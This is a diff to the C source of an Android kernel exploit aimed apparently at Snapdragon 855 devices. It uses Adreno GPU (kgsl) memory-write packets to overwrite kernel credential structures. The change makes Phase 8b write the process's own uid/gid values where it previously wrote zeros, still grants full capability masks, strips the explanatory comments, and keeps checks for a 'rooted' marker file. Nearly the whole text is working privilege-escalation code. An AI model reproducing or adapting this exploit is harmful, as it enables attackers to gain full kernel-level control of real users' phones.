@@ -624,9 +624,14 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8b: Direct cred overwrite (Snapdragon 855 オフセット修正版) =====
     if (n_cred > 0) {
-        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
+        printf("[*] Phase 8b: Writing uid/gid = current process values + full caps to %d cred pages\n", n_cred);
+        uid_t ruid, euid, suid;
+        gid_t rgid, egid, sgid;
+        getresuid(&ruid, &euid, &suid);
+        getresgid(&rgid, &egid, &sgid);
+        uint32_t id_vals[8] = { ruid, rgid, suid, sgid, euid, egid, euid, egid };
+
         int n_ok = 0;
         for (int p = 0; p < n_cred && p < 32; p++) {
             uint64_t cbase = cred_pages[p] + cred_offs[p];
@@ -634,7 +639,6 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
-            // Read BEFORE (uid は cbase+0x10)
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
@@ -652,7 +656,6 @@ int main(int argc, char **argv) {
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t *bd = (uint32_t *)dst_m;
-            // uid は offset 0x10 → bd[4]
             printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
                 p, bd[31], bd[30], bd[4]);
 
@@ -668,38 +671,22 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // 書き込み: オフセット 0x10 から 19 ワード
-            //   uid～fsgid (8ワード) を 0
-            //   securebits (0x30) = 0x00000004
-            //   CapInh (0x34-0x37) = 0x00000003ffffffff
-            //   CapPrm (0x3c-0x3f) = 0x00000003ffffffff
-            //   CapEff (0x44-0x47) = 0x00000003ffffffff
-            //   CapBset (0x4c-0x4f) = 0x00000003ffffffff
-            //   CapAmbient (0x54-0x57) = 0x00000003ffffffff
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x10, &zl, &zh);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);
             cmd[dw++] = zl; cmd[dw++] = zh;
 
-            // 8 ワードの 0 (uid～fsgid)
-            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+            for (int i = 0; i < 8; i++) cmd[dw++] = id_vals[i];
 
-            // securebits (0x30)
             cmd[dw++] = 0x00000004;
 
-            // CapInh (0x34)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapPrm (0x3c)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapEff (0x44)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapBset (0x4c)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapAmbient (0x54)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
 
-            // Readback uid (cbase+0x10)
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
             split64(cbase + 0x10, &sl, &sh);
@@ -712,15 +699,13 @@ int main(int argc, char **argv) {
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t uid = *(volatile uint32_t*)dst_m;
-            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
-                uid == 0 ? "OK" : "FAIL");
+            printf("  CRED[%d]: uid=0x%08X %s (expected 0x%08X)\n", p, uid,
+                uid == id_vals[0] ? "OK" : "FAIL", id_vals[0]);
 
-            // Force CPU cache flush for the modified cred page
             flush_dc_civac_range((void*)cred_pages[p], 0x1000);
         }
         printf("  Phase 8b: %d creds updated\n", n_ok);
 
-        // Read cred page AFTER
         if (n_cred > 0) {
             printf("[*] Phase 8c: Dumping cred page AFTER write\n");
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
@@ -775,7 +760,6 @@ int main(int argc, char **argv) {
     if (r != sizeof(winner)) {
         if (poll(&pfd, 1, 10000) > 0 &&
             read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
-            // success
         } else {
             int fd = open("/data/local/tmp/rooted", O_RDONLY);
             if (fd >= 0) {
